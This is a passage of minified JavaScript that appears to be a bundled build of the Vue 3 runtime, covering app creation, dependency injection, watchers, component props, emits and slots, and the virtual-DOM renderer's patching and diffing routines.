            isNativeTag: $r,
            performance: !1,
            globalProperties: {},
            optionMergeStrategies: {},
            errorHandler: void 0,
            warnHandler: void 0,
            compilerOptions: {}
        },
        mixins: [],
        components: {},
        directives: {},
        provides: Object.create(null),
        optionsCache: new WeakMap,
        propsCache: new WeakMap,
        emitsCache: new WeakMap
    }
}
let p6 = 0;

function m6(e, t) {
    return function(r, s = null) {
        te(r) || (r = ae({}, r)), s != null && !me(s) && (s = null);
        const i = G1(),
            o = new WeakSet,
            a = [];
        let c = !1;
        const u = i.app = {
            _uid: p6++,
            _component: r,
            _props: s,
            _container: null,
            _context: i,
            _instance: null,
            version: P2,
            get config() {
                return i.config
            },
            set config(l) {},
            use(l, ...f) {
                return o.has(l) || (l && te(l.install) ? (o.add(l), l.install(u, ...f)) : te(l) && (o.add(l), l(u, ...f))), u
            },
            mixin(l) {
                return i.mixins.includes(l) || i.mixins.push(l), u
            },
            component(l, f) {
                return f ? (i.components[l] = f, u) : i.components[l]
            },
            directive(l, f) {
                return f ? (i.directives[l] = f, u) : i.directives[l]
            },
            mount(l, f, d) {
                if (!c) {
                    const h = u._ceVNode || Te(r, s);
                    return h.appContext = i, d === !0 ? d = "svg" : d === !1 && (d = void 0), f && t ? t(h, l) : e(h, l, d), c = !0, u._container = l, l.__vue_app__ = u, Ho(h.component)
                }
            },
            onUnmount(l) {
                a.push(l)
            },
            unmount() {
                c && (jt(a, u._instance, 16), e(null, u._container), delete u._container.__vue_app__)
            },
            provide(l, f) {
                return i.provides[l] = f, u
            },
            runWithContext(l) {
                const f = Gr;
                Gr = u;
                try {
                    return l()
                } finally {
                    Gr = f
                }
            }
        };
        return u
    }
}
let Gr = null;

function W1(e, t) {
    if (qe) {
        let n = qe.provides;
        const r = qe.parent && qe.parent.provides;
        r === n && (n = qe.provides = Object.create(r)), n[e] = t
    }
}

function Fi(e, t, n = !1) {
    const r = vt();
    if (r || Gr) {
        let s = Gr ? Gr._context.provides : r ? r.parent == null || r.ce ? r.vnode.appContext && r.vnode.appContext.provides : r.parent.provides : void 0;
        if (s && e in s) return s[e];
        if (arguments.length > 1) return n && te(t) ? t.call(r && r.proxy) : t
    }
}

function b6() {
    return !!(vt() || Gr)
}
const X1 = Symbol.for("v-scx"),
    K1 = () => Fi(X1);

function g6(e, t) {
    return Vo(e, null, t)
}

function x6(e, t) {
    return Vo(e, null, {
        flush: "post"
    })
}

function Z1(e, t) {
    return Vo(e, null, {
        flush: "sync"
    })
}

function Rs(e, t, n) {
    return Vo(e, t, n)
}

function Vo(e, t, n = ue) {
    const {
        immediate: r,
        deep: s,
        flush: i,
        once: o
    } = n, a = ae({}, n), c = t && r || !t && i !== "post";
    let u;
    if (Vs) {
        if (i === "sync") {
            const h = K1();
            u = h.__watcherHandles || (h.__watcherHandles = [])
        } else if (!c) {
            const h = () => {};
            return h.stop = He, h.resume = He, h.pause = He, h
        }
    }
    const l = qe;
    a.call = (h, b, m) => jt(h, l, b, m);
    let f = !1;
    i === "post" ? a.scheduler = h => {
        Re(h, l && l.suspense)
    } : i !== "sync" && (f = !0, a.scheduler = (h, b) => {
        b ? h() : L0(h)
    }), a.augmentJob = h => {
        t && (h.flags |= 4), f && (h.flags |= 2, l && (h.id = l.uid, h.i = l))
    };
    const d = f5(e, t, a);
    return Vs && (u ? u.push(d) : c && d()), d
}

function y6(e, t, n) {
    const r = this.proxy,
        s = re(e) ? e.includes(".") ? Y1(r, e) : () => r[e] : e.bind(r, r);
    let i;
    te(t) ? i = t : (i = t.handler, n = t);
    const o = Qr(this),
        a = Vo(s, i.bind(r), n);
    return o(), a
}

function Y1(e, t) {
    const n = t.split(".");
    return () => {
        let r = e;
        for (let s = 0; s < n.length && r; s++) r = r[n[s]];
        return r
    }
}

function w6(e, t, n = ue) {
    const r = vt(),
        s = _e(t),
        i = nt(t),
        o = J1(e, s),
        a = x1((c, u) => {
            let l, f = ue,
                d;
            return Z1(() => {
                const h = e[s];
                et(l, h) && (l = h, u())
            }), {
                get() {
                    return c(), n.get ? n.get(l) : l
                },
                set(h) {
                    const b = n.set ? n.set(h) : h;
                    if (!et(b, l) && !(f !== ue && et(h, f))) return;
                    const m = r.vnode.props;
                    m && (t in m || s in m || i in m) && (`onUpdate:${t}` in m || `onUpdate:${s}` in m || `onUpdate:${i}` in m) || (l = h, u()), r.emit(`update:${t}`, b), et(h, b) && et(h, f) && !et(b, d) && u(), f = h, d = b
                }
            }
        });
    return a[Symbol.iterator] = () => {
        let c = 0;
        return {
            next() {
                return c < 2 ? {
                    value: c++ ? o || ue : a,
                    done: !1
                } : {
                    done: !0
                }
            }
        }
    }, a
}
const J1 = (e, t) => t === "modelValue" || t === "model-value" ? e.modelModifiers : e[`${t}Modifiers`] || e[`${_e(t)}Modifiers`] || e[`${nt(t)}Modifiers`];

function _6(e, t, ...n) {
    if (e.isUnmounted) return;
    const r = e.vnode.props || ue;
    let s = n;
    const i = t.startsWith("update:"),
        o = i && J1(r, t.slice(7));
    o && (o.trim && (s = n.map(l => re(l) ? l.trim() : l)), o.number && (s = n.map(ko)));
    let a, c = r[a = jr(t)] || r[a = jr(_e(t))];
    !c && i && (c = r[a = jr(nt(t))]), c && jt(c, e, 6, s);
    const u = r[a + "Once"];
    if (u) {
        if (!e.emitted) e.emitted = {};
        else if (e.emitted[a]) return;
        e.emitted[a] = !0, jt(u, e, 6, s)
    }
}
const E6 = new WeakMap;

function Q1(e, t, n = !1) {
    const r = n ? E6 : t.emitsCache,
        s = r.get(e);
    if (s !== void 0) return s;
    const i = e.emits;
    let o = {},
        a = !1;
    if (!te(e)) {
        const c = u => {
            const l = Q1(u, t, !0);
            l && (a = !0, ae(o, l))
        };
        !n && t.mixins.length && t.mixins.forEach(c), e.extends && c(e.extends), e.mixins && e.mixins.forEach(c)
    }
    return !i && !a ? (me(e) && r.set(e, null), null) : (K(i) ? i.forEach(c => o[c] = null) : ae(o, i), me(e) && r.set(e, o), o)
}

function Uc(e, t) {
    return !e || !vr(t) ? !1 : (t = t.slice(2).replace(/Once$/, ""), pe(e, t[0].toLowerCase() + t.slice(1)) || pe(e, nt(t)) || pe(e, t))
}

function Aa(e) {
    const {
        type: t,
        vnode: n,
        proxy: r,
        withProxy: s,
        propsOptions: [i],
        slots: o,
        attrs: a,
        emit: c,
        render: u,
        renderCache: l,
        props: f,
        data: d,
        setupState: h,
        ctx: b,
        inheritAttrs: m
    } = e, _ = Ki(e);
    let E, S;
    try {
        if (n.shapeFlag & 4) {
            const p = s || r,
                w = p;
            E = xt(u.call(w, p, l, f, h, d, b)), S = a
        } else {
            const p = t;
            E = xt(p.length > 1 ? p(f, {
                attrs: a,
                slots: o,
                emit: c
            }) : p(f, null)), S = t.props ? a : T6(a)
        }
    } catch (p) {
        Ui.length = 0, ds(p, e, 1), E = Te(Pe)
    }
    let g = E;
    if (S && m !== !1) {
        const p = Object.keys(S),
            {
                shapeFlag: w
            } = g;
        p.length && w & 7 && (i && p.some(Tc) && (S = S6(S, i)), g = mn(g, S, !1, !0))
    }
    return n.dirs && (g = mn(g, null, !1, !0), g.dirs = g.dirs ? g.dirs.concat(n.dirs) : n.dirs), n.transition && qn(g, n.transition), E = g, Ki(_), E
}

function v6(e, t = !0) {
    let n;
    for (let r = 0; r < e.length; r++) {
        const s = e[r];
        if (Gn(s)) {
            if (s.type !== Pe || s.children === "v-if") {
                if (n) return;
                n = s
            }
        } else return
    }
    return n
}
const T6 = e => {
        let t;
        for (const n in e)(n === "class" || n === "style" || vr(n)) && ((t || (t = {}))[n] = e[n]);
        return t
    },
    S6 = (e, t) => {
        const n = {};
        for (const r in e)(!Tc(r) || !(r.slice(9) in t)) && (n[r] = e[r]);
        return n
    };

function C6(e, t, n) {
    const {
        props: r,
        children: s,
        component: i
    } = e, {
        props: o,
        children: a,
        patchFlag: c
    } = t, u = i.emitsOptions;
    if (t.dirs || t.transition) return !0;
    if (n && c >= 0) {
        if (c & 1024) return !0;
        if (c & 16) return r ? zd(r, o, u) : !!o;
        if (c & 8) {
            const l = t.dynamicProps;
            for (let f = 0; f < l.length; f++) {
                const d = l[f];
                if (o[d] !== r[d] && !Uc(u, d)) return !0
            }
        }
    } else return (s || a) && (!a || !a.$stable) ? !0 : r === o ? !1 : r ? o ? zd(r, o, u) : !0 : !!o;
    return !1
}

function zd(e, t, n) {
    const r = Object.keys(t);
    if (r.length !== Object.keys(e).length) return !0;
    for (let s = 0; s < r.length; s++) {
        const i = r[s];
        if (t[i] !== e[i] && !Uc(n, i)) return !0
    }
    return !1
}

function Vc({
    vnode: e,
    parent: t
}, n) {
    for (; t;) {
        const r = t.subTree;
        if (r.suspense && r.suspense.activeBranch === e && (r.el = e.el), r === e)(e = t.vnode).el = n, t = t.parent;
        else break
    }
}
const e2 = {},
    t2 = () => Object.create(e2),
    n2 = e => Object.getPrototypeOf(e) === e2;

function I6(e, t, n, r = !1) {
    const s = {},
        i = t2();
    e.propsDefaults = Object.create(null), r2(e, t, s, i);
    for (const o in e.propsOptions[0]) o in s || (s[o] = void 0);
    n ? e.props = r ? s : p1(s) : e.type.props ? e.props = s : e.props = i, e.attrs = i
}

function A6(e, t, n, r) {
    const {
        props: s,
        attrs: i,
        vnode: {
            patchFlag: o
        }
    } = e, a = he(s), [c] = e.propsOptions;
    let u = !1;
    if ((r || o > 0) && !(o & 16)) {
        if (o & 8) {
            const l = e.vnode.dynamicProps;
            for (let f = 0; f < l.length; f++) {
                let d = l[f];
                if (Uc(e.emitsOptions, d)) continue;
                const h = t[d];
                if (c)
                    if (pe(i, d)) h !== i[d] && (i[d] = h, u = !0);
                    else {
                        const b = _e(d);
                        s[b] = Tu(c, a, b, h, e, !1)
                    }
                else h !== i[d] && (i[d] = h, u = !0)
            }
        }
    } else {
        r2(e, t, s, i) && (u = !0);
        let l;
        for (const f in a)(!t || !pe(t, f) && ((l = nt(f)) === f || !pe(t, l))) && (c ? n && (n[f] !== void 0 || n[l] !== void 0) && (s[f] = Tu(c, a, f, void 0, e, !0)) : delete s[f]);
        if (i !== a)
            for (const f in i)(!t || !pe(t, f)) && (delete i[f], u = !0)
    }
    u && On(e.attrs, "set", "")
}

function r2(e, t, n, r) {
    const [s, i] = e.propsOptions;
    let o = !1,
        a;
    if (t)
        for (let c in t) {
            if (Bn(c)) continue;
            const u = t[c];
            let l;
            s && pe(s, l = _e(c)) ? !i || !i.includes(l) ? n[l] = u : (a || (a = {}))[l] = u : Uc(e.emitsOptions, c) || (!(c in r) || u !== r[c]) && (r[c] = u, o = !0)
        }
    if (i) {
        const c = he(n),
            u = a || ue;
        for (let l = 0; l < i.length; l++) {
            const f = i[l];
            n[f] = Tu(s, c, f, u[f], e, !pe(u, f))
        }
    }
    return o
}

function Tu(e, t, n, r, s, i) {
    const o = e[n];
    if (o != null) {
        const a = pe(o, "default");
        if (a && r === void 0) {
            const c = o.default;
            if (o.type !== Function && !o.skipFactory && te(c)) {
                const {
                    propsDefaults: u
                } = s;
                if (n in u) r = u[n];
                else {
                    const l = Qr(s);
                    r = u[n] = c.call(null, t), l()
                }
            } else r = c;
            s.ce && s.ce._setProp(n, r)
        }
        o[0] && (i && !a ? r = !1 : o[1] && (r === "" || r === nt(n)) && (r = !0))
    }
    return r
}
const N6 = new WeakMap;

function s2(e, t, n = !1) {
    const r = n ? N6 : t.propsCache,
        s = r.get(e);
    if (s) return s;
    const i = e.props,
        o = {},
        a = [];
    let c = !1;
    if (!te(e)) {
        const l = f => {
            c = !0;
            const [d, h] = s2(f, t, !0);
            ae(o, d), h && a.push(...h)
        };
        !n && t.mixins.length && t.mixins.forEach(l), e.extends && l(e.extends), e.mixins && e.mixins.forEach(l)
    }
    if (!i && !c) return me(e) && r.set(e, Vr), Vr;
    if (K(i))
        for (let l = 0; l < i.length; l++) {
            const f = _e(i[l]);
            qd(f) && (o[f] = ue)
        } else if (i)
            for (const l in i) {
                const f = _e(l);
                if (qd(f)) {
                    const d = i[l],
                        h = o[f] = K(d) || te(d) ? {
                            type: d
                        } : ae({}, d),
                        b = h.type;
                    let m = !1,
                        _ = !0;
                    if (K(b))
                        for (let E = 0; E < b.length; ++E) {
                            const S = b[E],
                                g = te(S) && S.name;
                            if (g === "Boolean") {
                                m = !0;
                                break
                            } else g === "String" && (_ = !1)
                        } else m = te(b) && b.name === "Boolean";
                    h[0] = m, h[1] = _, (m || pe(h, "default")) && a.push(f)
                }
            }
    const u = [o, a];
    return me(e) && r.set(e, u), u
}

function qd(e) {
    return e[0] !== "$" && !Bn(e)
}
const W0 = e => e === "_" || e === "_ctx" || e === "$stable",
    X0 = e => K(e) ? e.map(xt) : [xt(e)],
    P6 = (e, t, n) => {
        if (t._n) return t;
        const r = $0((...s) => X0(t(...s)), n);
        return r._c = !1, r
    },
    i2 = (e, t, n) => {
        const r = e._ctx;
        for (const s in e) {
            if (W0(s)) continue;
            const i = e[s];
            if (te(i)) t[s] = P6(s, i, r);
            else if (i != null) {
                const o = X0(i);
                t[s] = () => o
            }
        }
    },
    o2 = (e, t) => {
        const n = X0(t);
        e.slots.default = () => n
    },
    a2 = (e, t, n) => {
        for (const r in t)(n || !W0(r)) && (e[r] = t[r])
    },
    O6 = (e, t, n) => {
        const r = e.slots = t2();
        if (e.vnode.shapeFlag & 32) {
            const s = t._;
            s ? (a2(r, t, n), n && I0(r, "_", s, !0)) : i2(t, r)
        } else t && o2(e, t)
    },
    R6 = (e, t, n) => {
        const {
            vnode: r,
            slots: s
        } = e;
        let i = !0,
            o = ue;
        if (r.shapeFlag & 32) {
            const a = t._;
            a ? n && a === 1 ? i = !1 : a2(s, t, n) : (i = !t.$stable, i2(t, s)), o = t
        } else t && (o2(e, t), o = {
            default: 1
        });
        if (i)
            for (const a in s) !W0(a) && o[a] == null && delete s[a]
    },
    Re = p2;

function c2(e) {
    return u2(e)
}

function l2(e) {
    return u2(e, N5)
}

function u2(e, t) {
    const n = Bo();
    n.__VUE__ = !0;
    const {
        insert: r,
        remove: s,
        patchProp: i,
        createElement: o,
        createText: a,
        createComment: c,
        setText: u,
        setElementText: l,
        parentNode: f,
        nextSibling: d,
        setScopeId: h = He,
        insertStaticContent: b
    } = e, m = (C, P, $, j = null, U = null, V = null, X = void 0, W = null, G = !!P.dynamicChildren) => {
        if (C === P) return;
        C && !Xt(C, P) && (j = Ct(C), le(C, U, V, !0), C = null), P.patchFlag === -2 && (G = !1, P.dynamicChildren = null);
        const {
            type: H,
            ref: ne,
            shapeFlag: Z
        } = P;
        switch (H) {
            case mr:
                _(C, P, $, j);
                break;
            case Pe:
                E(C, P, $, j);
                break;
            case Wr:
                C == null && S(P, $, j, X);
                break;
            case Ne:
                T(C, P, $, j, U, V, X, W, G);
                break;
            default:
                Z & 1 ? w(C, P, $, j, U, V, X, W, G) : Z & 6 ? O(C, P, $, j, U, V, X, W, G) : (Z & 64 || Z & 128) && H.process(C, P, $, j, U, V, X, W, G, It)
        }
        ne != null && U ? Os(ne, C && C.ref, V, P || C, !P) : ne == null && C && C.ref != null && Os(C.ref, null, V, C, !0)
    }, _ = (C, P, $, j) => {
        if (C == null) r(P.el = a(P.children), $, j);
        else {
            const U = P.el = C.el;
            P.children !== C.children && u(U, P.children)
        }
    }, E = (C, P, $, j) => {
        C == null ? r(P.el = c(P.children || ""), $, j) : P.el = C.el
    }, S = (C, P, $, j) => {
        [C.el, C.anchor] = b(C.children, P, $, j, C.el, C.anchor)
    }, g = ({
        el: C,
        anchor: P
    }, $, j) => {
        let U;
        for (; C && C !== P;) U = d(C), r(C, $, j), C = U;
        r(P, $, j)
    }, p = ({
        el: C,
        anchor: P
    }) => {
        let $;
        for (; C && C !== P;) $ = d(C), s(C), C = $;
        s(P)
    }, w = (C, P, $, j, U, V, X, W, G) => {
        if (P.type === "svg" ? X = "svg" : P.type === "math" && (X = "mathml"), C == null) A(P, $, j, U, V, X, W, G);
        else {
            const H = C.el && C.el._isVueCE ? C.el : null;
            try {
                H && H._beginPatch(), y(C, P, U, V, X, W, G)
            } finally {
                H && H._endPatch()
            }
        }
    }, A = (C, P, $, j, U, V, X, W) => {
        let G, H;
        const {
            props: ne,
            shapeFlag: Z,
            transition: ee,
            dirs: ie
        } = C;
        if (G = C.el = o(C.type, V, ne && ne.is, ne), Z & 8 ? l(G, C.children) : Z & 16 && v(C.children, G, null, j, U, $l(C, V), X, W), ie && fn(C, null, j, "created"), N(G, C, C.scopeId, X, j), ne) {
            for (const ye in ne) ye !== "value" && !Bn(ye) && i(G, ye, null, ne[ye], V, j);
            "value" in ne && i(G, "value", null, ne.value, V), (H = ne.onVnodeBeforeMount) && bt(H, j, C)
        }
        ie && fn(C, null, j, "beforeMount");
        const de = f2(U, ee);
        de && ee.beforeEnter(G), r(G, P, $), ((H = ne && ne.onVnodeMounted) || de || ie) && Re(() => {
            H && bt(H, j, C), de && ee.enter(G), ie && fn(C, null, j, "mounted")
        }, U)
    }, N = (C, P, $, j, U) => {
        if ($ && h(C, $), j)
            for (let V = 0; V < j.length; V++) h(C, j[V]);
        if (U) {
            let V = U.subTree;
            if (P === V || Xa(V.type) && (V.ssContent === P || V.ssFallback === P)) {
                const X = U.vnode;
                N(C, X, X.scopeId, X.slotScopeIds, U.parent)
            }
        }
    }, v = (C, P, $, j, U, V, X, W, G = 0) => {
        for (let H = G; H < C.length; H++) {
            const ne = C[H] = W ? fr(C[H]) : xt(C[H]);
            m(null, ne, P, $, j, U, V, X, W)
        }
    }, y = (C, P, $, j, U, V, X) => {
        const W = P.el = C.el;
        let {
            patchFlag: G,
            dynamicChildren: H,
            dirs: ne
        } = P;
        G |= C.patchFlag & 16;
        const Z = C.props || ue,
            ee = P.props || ue;
        let ie;
        if ($ && kr($, !1), (ie = ee.onVnodeBeforeUpdate) && bt(ie, $, P, C), ne && fn(P, C, $, "beforeUpdate"), $ && kr($, !0), (Z.innerHTML && ee.innerHTML == null || Z.textContent && ee.textContent == null) && l(W, ""), H ? x(C.dynamicChildren, H, W, $, j, $l(P, U), V) : X || B(C, P, W, null, $, j, $l(P, U), V, !1), G > 0) {
            if (G & 16) I(W, Z, ee, $, U);
            else if (G & 2 && Z.class !== ee.class && i(W, "class", null, ee.class, U), G & 4 && i(W, "style", Z.style, ee.style, U), G & 8) {
                const de = P.dynamicProps;
                for (let ye = 0; ye < de.length; ye++) {
                    const ge = de[ye],
                        ht = Z[ge],
                        Ze = ee[ge];
                    (Ze !== ht || ge === "value") && i(W, ge, ht, Ze, U, $)
                }
            }
            G & 1 && C.children !== P.children && l(W, P.children)
        } else !X && H == null && I(W, Z, ee, $, U);
        ((ie = ee.onVnodeUpdated) || ne) && Re(() => {
            ie && bt(ie, $, P, C), ne && fn(P, C, $, "updated")
        }, j)
    }, x = (C, P, $, j, U, V, X) => {
        for (let W = 0; W < P.length; W++) {
            const G = C[W],
                H = P[W],
                ne = G.el && (G.type === Ne || !Xt(G, H) || G.shapeFlag & 198) ? f(G.el) : $;
            m(G, H, ne, null, j, U, V, X, !0)
        }
    }, I = (C, P, $, j, U) => {
        if (P !== $) {
            if (P !== ue)
                for (const V in P) !Bn(V) && !(V in $) && i(C, V, P[V], null, U, j);
            for (const V in $) {
                if (Bn(V)) continue;
                const X = $[V],
                    W = P[V];
                X !== W && V !== "value" && i(C, V, W, X, U, j)
            }
            "value" in $ && i(C, "value", P.value, $.value, U)
        }
    }, T = (C, P, $, j, U, V, X, W, G) => {
        const H = P.el = C ? C.el : a(""),
            ne = P.anchor = C ? C.anchor : a("");
        let {
            patchFlag: Z,
            dynamicChildren: ee,
            slotScopeIds: ie
        } = P;
        ie && (W = W ? W.concat(ie) : ie), C == null ? (r(H, $, j), r(ne, $, j), v(P.children || [], $, ne, U, V, X, W, G)) : Z > 0 && Z & 64 && ee && C.dynamicChildren ? (x(C.dynamicChildren, ee, $, U, V, X, W), (P.key != null || U && P === U.subTree) && K0(C, P, !0)) : B(C, P, $, ne, U, V, X, W, G)
    }, O = (C, P, $, j, U, V, X, W, G) => {
        P.slotScopeIds = W, C == null ? P.shapeFlag & 512 ? U.ctx.activate(P, $, j, X, G) : L(P, $, j, U, V, X, G) : k(C, P, G)
    }, L = (C, P, $, j, U, V, X) => {
        const W = C.component = E2(C, j, U);
        if (Fo(C) && (W.ctx.renderer = It), T2(W, !1, X), W.asyncDep) {
            if (U && U.registerDep(W, R, X), !C.el) {
                const G = W.subTree = Te(Pe);
                E(null, G, P, $), C.placeholder = G.el
            }
        } else R(W, C, P, $, U, V, X)
    }, k = (C, P, $) => {
        const j = P.component = C.component;
        if (C6(C, P, $))
            if (j.asyncDep && !j.asyncResolved) {
                D(j, P, $);
                return
            } else j.next = P, j.update();
        else P.el = C.el, j.vnode = P
    }, R = (C, P, $, j, U, V, X) => {
        const W = () => {
            if (C.isMounted) {
                let {
                    next: Z,
                    bu: ee,
                    u: ie,
                    parent: de,
                    vnode: ye
                } = C;
                {
                    const At = d2(C);
                    if (At) {
                        Z && (Z.el = ye.el, D(C, Z, X)), At.asyncDep.then(() => {
                            C.isUnmounted || W()
                        });
                        return
                    }
                }
                let ge = Z,
                    ht;
                kr(C, !1), Z ? (Z.el = ye.el, D(C, Z, X)) : Z = ye, ee && zr(ee), (ht = Z.props && Z.props.onVnodeBeforeUpdate) && bt(ht, de, Z, ye), kr(C, !0);
                const Ze = Aa(C),
                    Gt = C.subTree;
                C.subTree = Ze, m(Gt, Ze, f(Gt.el), Ct(Gt), C, U, V), Z.el = Ze.el, ge === null && Vc(C, Ze.el), ie && Re(ie, U), (ht = Z.props && Z.props.onVnodeUpdated) && Re(() => bt(ht, de, Z, ye), U)
            } else {
                let Z;
                const {
                    el: ee,
                    props: ie
                } = P, {
                    bm: de,
                    m: ye,
                    parent: ge,
                    root: ht,
                    type: Ze
                } = C, Gt = pr(P);
                if (kr(C, !1), de && zr(de), !Gt && (Z = ie && ie.onVnodeBeforeMount) && bt(Z, ge, P), kr(C, !0), ee && wn) {
                    const At = () => {
                        C.subTree = Aa(C), wn(ee, C.subTree, C, U, null)
                    };
                    Gt && Ze.__asyncHydrate ? Ze.__asyncHydrate(ee, C, At) : At()
                } else {
                    ht.ce && ht.ce._def.shadowRoot !== !1 && ht.ce._injectChildStyle(Ze);
                    const At = C.subTree = Aa(C);
                    m(null, At, $, j, C, U, V), P.el = At.el
                }
                if (ye && Re(ye, U), !Gt && (Z = ie && ie.onVnodeMounted)) {
                    const At = P;
                    Re(() => bt(Z, ge, At), U)
                }(P.shapeFlag & 256 || ge && pr(ge.vnode) && ge.vnode.shapeFlag & 256) && C.a && Re(C.a, U), C.isMounted = !0, P = $ = j = null
            }
        };
        C.scope.on();
        const G = C.effect = new zi(W);
        C.scope.off();
        const H = C.update = G.run.bind(G),
            ne = C.job = G.runIfDirty.bind(G);
        ne.i = C, ne.id = C.uid, G.scheduler = () => L0(ne), kr(C, !0), H()
    }, D = (C, P, $) => {
        P.component = C;
        const j = C.vnode.props;
        C.vnode = P, C.next = null, A6(C, P.props, j, $), R6(C, P.children, $), jn(), Rd(C), zn()
    }, B = (C, P, $, j, U, V, X, W, G = !1) => {
        const H = C && C.children,
            ne = C ? C.shapeFlag : 0,
            Z = P.children,
            {
                patchFlag: ee,
                shapeFlag: ie
            } = P;
        if (ee > 0) {
            if (ee & 128) {
                Q(H, Z, $, j, U, V, X, W, G);
                return
            } else if (ee & 256) {
                q(H, Z, $, j, U, V, X, W, G);
                return
            }
        }
        ie & 8 ? (ne & 16 && $t(H, U, V), Z !== H && l($, Z)) : ne & 16 ? ie & 16 ? Q(H, Z, $, j, U, V, X, W, G) : $t(H, U, V, !0) : (ne & 8 && l($, ""), ie & 16 && v(Z, $, j, U, V, X, W, G))
    }, q = (C, P, $, j, U, V, X, W, G) => {
        C = C || Vr, P = P || Vr;
        const H = C.length,
            ne = P.length,
            Z = Math.min(H, ne);
        let ee;
        for (ee = 0; ee < Z; ee++) {
            const ie = P[ee] = G ? fr(P[ee]) : xt(P[ee]);
            m(C[ee], ie, $, null, U, V, X, W, G)
        }
        H > ne ? $t(C, U, V, !0, !1, Z) : v(P, $, j, U, V, X, W, G, Z)
    }, Q = (C, P, $, j, U, V, X, W, G) => {
        let H = 0;
        const ne = P.length;
        let Z = C.length - 1,
            ee = ne - 1;
        for (; H <= Z && H <= ee;) {
            const ie = C[H],
                de = P[H] = G ? fr(P[H]) : xt(P[H]);
            if (Xt(ie, de)) m(ie, de, $, null, U, V, X, W, G);
            else break;
            H++
        }
        for (; H <= Z && H <= ee;) {
            const ie = C[Z],
                de = P[ee] = G ? fr(P[ee]) : xt(P[ee]);
            if (Xt(ie, de)) m(ie, de, $, null, U, V, X, W, G);
            else break;
            Z--, ee--
        }
        if (H > Z) {
            if (H <= ee) {
                const ie = ee + 1,
                    de = ie < ne ? P[ie].el : j;
                for (; H <= ee;) m(null, P[H] = G ? fr(P[H]) : xt(P[H]), $, de, U, V, X, W, G), H++
            }
        } else if (H > ee)
            for (; H <= Z;) le(C[H], U, V, !0), H++;
        else {
            const ie = H,
                de = H,
                ye = new Map;
            for (H = de; H <= ee; H++) {
                const Nt = P[H] = G ? fr(P[H]) : xt(P[H]);
                Nt.key != null && ye.set(Nt.key, H)
            }
            let ge, ht = 0;
            const Ze = ee - de + 1;
            let Gt = !1,
                At = 0;
            const xi = new Array(Ze);
            for (H = 0; H < Ze; H++) xi[H] = 0;
            for (H = ie; H <= Z; H++) {
                const Nt = C[H];
                if (ht >= Ze) {
                    le(Nt, U, V, !0);
                    continue
                }
                let on;
                if (Nt.key != null) on = ye.get(Nt.key);
                else
                    for (ge = de; ge <= ee; ge++)
                        if (xi[ge - de] === 0 && Xt(Nt, P[ge])) {
                            on = ge;
                            break
                        } on === void 0 ? le(Nt, U, V, !0) : (xi[on - de] = H + 1, on >= At ? At = on : Gt = !0, m(Nt, P[on], $, null, U, V, X, W, G), ht++)
            }
            const Sd = Gt ? M6(xi) : Vr;
            for (ge = Sd.length - 1, H = Ze - 1; H >= 0; H--) {
                const Nt = de + H,
                    on = P[Nt],
                    Cd = P[Nt + 1],
                    Id = Nt + 1 < ne ? Cd.el || Cd.placeholder : j;
                xi[H] === 0 ? m(null, on, $, Id, U, V, X, W, G) : Gt && (ge < 0 || H !== Sd[ge] ? se(on, $, Id, 2) : ge--)
            }
        }
    }, se = (C, P, $, j, U = null) => {
        const {
            el: V,
            type: X,
            transition: W,
            children: G,
            shapeFlag: H
        } = C;
        if (H & 6) {
            se(C.component.subTree, P, $, j);
            return
        }
        if (H & 128) {
            C.suspense.move(P, $, j);
            return
        }
        if (H & 64) {
            X.move(C, P, $, It);
            return
        }
        if (X === Ne) {
            r(V, P, $);
            for (let Z = 0; Z < G.length; Z++) se(G[Z], P, $, j);
            r(C.anchor, P, $);
            return
        }
        if (X === Wr) {
            g(C, P, $);
            return
        }
        if (j !== 2 && H & 1 && W)
            if (j === 0) W.beforeEnter(V), r(V, P, $), Re(() => W.enter(V), U);
            else {
                const {
                    leave: Z,
                    delayLeave: ee,
                    afterLeave: ie
                } = W, de = () => {
                    C.ctx.isUnmounted ? s(V) : r(V, P, $)
                }, ye = () => {
                    V._isLeaving && V[An](!0), Z(V, () => {
                        de(), ie && ie()
                    })
                };
                ee ? ee(V, de, ye) : ye()
            }
        else r(V, P, $)
    }, le = (C, P, $, j = !1, U = !1) => {
        const {
            type: V,
            props: X,
            ref: W,
            children: G,
            dynamicChildren: H,
            shapeFlag: ne,
            patchFlag: Z,
            dirs: ee,
            cacheIndex: ie
        } = C;
        if (Z === -2 && (U = !1), W != null && (jn(), Os(W, null, $, C, !0), zn()), ie != null && (P.renderCache[ie] = void 0), ne & 256) {
            P.ctx.deactivate(C);
            return
        }
        const de = ne & 1 && ee,
            ye = !pr(C);
        let ge;
        if (ye && (ge = X && X.onVnodeBeforeUnmount) && bt(ge, P, C), ne & 6) De(C.component, $, j);
        else {
            if (ne & 128) {
                C.suspense.unmount($, j);
                return
            }
            de && fn(C, null, P, "beforeUnmount"), ne & 64 ? C.type.remove(C, P, $, It, j) : H && !H.hasOnce && (V !== Ne || Z > 0 && Z & 64) ? $t(H, P, $, !1, !0) : (V === Ne && Z & 384 || !U && ne & 16) && $t(G, P, $), j && dt(C)
        }(ye && (ge = X && X.onVnodeUnmounted) || de) && Re(() => {
            ge && bt(ge, P, C), de && fn(C, null, P, "unmounted")
        }, $)
    }, dt = C => {
        const {
            type: P,
            el: $,
            anchor: j,
            transition: U
        } = C;
        if (P === Ne) {
            Ke($, j);
            return
        }
        if (P === Wr) {
            p(C);
            return
        }
        const V = () => {
            s($), U && !U.persisted && U.afterLeave && U.afterLeave()
        };
        if (C.shapeFlag & 1 && U && !U.persisted) {
            const {
                leave: X,
                delayLeave: W
            } = U, G = () => X($, V);
            W ? W(C.el, V, G) : G()
        } else V()
    }, Ke = (C, P) => {
        let $;
        for (; C !== P;) $ = d(C), s(C), C = $;
        s(P)
    }, De = (C, P, $) => {
        const {
            bum: j,
            scope: U,
            job: V,
            subTree: X,
            um: W,
            m: G,
            a: H
        } = C;
        Wa(G), Wa(H), j && zr(j), U.stop(), V && (V.flags |= 8, le(X, C, P, $)), W && Re(W, P), Re(() => {
            C.isUnmounted = !0
        }, P)
    }, $t = (C, P, $, j = !1, U = !1, V = 0) => {
        for (let X = V; X < C.length; X++) le(C[X], P, $, j, U)
    }, Ct = C => {
        if (C.shapeFlag & 6) return Ct(C.component.subTree);
        if (C.shapeFlag & 128) return C.suspense.next();
        const P = d(C.anchor || C.el),
            $ = P && P[C1];
        return $ ? d($) : P
    };
    let Rr = !1;
    const sn = (C, P, $) => {
            C == null ? P._vnode && le(P._vnode, null, null, !0) : m(P._vnode || null, C, P, null, null, null, $), P._vnode = C, Rr || (Rr = !0, Rd(), za(), Rr = !1)
